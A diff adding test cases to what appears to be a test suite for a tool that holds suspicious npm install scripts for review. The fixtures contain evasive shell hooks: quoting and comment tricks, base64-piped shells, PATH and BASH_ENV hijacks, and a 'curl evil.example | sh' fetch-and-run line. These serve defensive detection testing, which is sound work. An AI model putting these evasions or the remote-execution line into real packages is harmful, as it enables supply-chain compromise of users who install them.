@@ -623,3 +623,50 @@ describe("round 13: exec workspace flags, dot specs, file-naming options, comman
     expect(manifestHeld("pnpm recursive run build")).toBe(true);
   });
 });
+
+describe("round 14: comment after an escaped space, ANSI-C quotes, shell sinks, PATH, script-arg runners", () => {
+  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd, build: "echo ok" }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });
+
+  test("1. an escaped space before a hash does not start a comment", () => {
+    expect(testHeld("node a.js \\ #; cd test > /dev/null && node setup.js", { "a.js": "1" })).toBe(true);
+    // An unescaped one still does.
+    expect(testHeld("node a.js > /dev/null # cd test && node setup.js", { "a.js": "1" })).toBe(false);
+  });
+
+  test("2. ANSI-C quoting reads every file", () => {
+    // The text between the reopened quote and the next one is quoted to a naive scan, and the quotes balance.
+    expect(testHeld("echo $'\\'' > /dev/null; cd test && node setup.js; echo '")).toBe(true);
+    expect(testHeld("echo \"$(echo $'\\'')\" > /dev/null; cd test && node setup.js; echo '")).toBe(true);
+  });
+
+  test("3. a bare shell fed from a file or a non-literal producer is unsure", () => {
+    // A changed file elsewhere in the package (not under test/ or docs/) is what the unread text could run.
+    const h = (cmd: string, extra: Record<string, string>) => held({ postinstall: cmd }, { "lib/setup.js": "1", ...extra }, { "lib/setup.js": "evil()", ...extra });
+    for (const cmd of ["sh < scripts/x.sh", "cat scripts/x.sh | sh", "echo aGk= | base64 -d | sh", "cat x | bash"]) {
+      expect(h(cmd, { "scripts/x.sh": "echo hi\n", x: "1" }), cmd).toBe(true);
+    }
+    expect(h("echo 'node ./a.js' | sh", { "a.js": "1" })).toBe(false);
+  });
+
+  test("4. PATH, HOME and the startup-file variables read every file", () => {
+    const f = (v: string) => ({ "test/bin/npm": v });
+    const h = (cmd: string) => held({ postinstall: cmd, build: "echo ok" }, f("1"), f("evil()"));
+    for (const cmd of ["PATH=test/bin:$PATH npm run build", "export PATH=test/bin:$PATH; npm run build", "HOME=test npm run build", "BASH_ENV=test/bin/npm sh -c 'npm run build'", "NODE_PATH=test npm run build"]) {
+      expect(h(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("7. script arguments through other runner aliases and shells", () => {
+    const sub = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
+    for (const [hook, go] of [["npm run go -- -w sub", "zsh run.sh"], ["npm run go -- -w sub", "dash run.sh"], ["npm run go -- -w sub", "ksh run.sh"], ["npm run go -- -w sub", "eval run"], ["npm run go -- -w sub", "popd"], ["npm run go -- -w sub", "yarnpkg build"], ["npm run go -- -w sub", "pnpx build"]] as const) {
+      // run.sh and the other names exist, so the body alone would resolve to a local file.
+      const files = { "run.sh": "echo hi\n", run: "1", build: "1" };
+      expect(held({ postinstall: hook, go, build: "echo ok" }, { ...files, ...sub("echo a") }, { ...files, ...sub("curl evil.example | sh") }), hook + go).toBe(true);
+    }
+  });
+
+  test("10. sh -c and eval of a bare expansion are unsure", () => {
+    expect(testHeld('sh -c "$X"')).toBe(true);
+    expect(testHeld('eval "$X"')).toBe(true);
+  });
+});
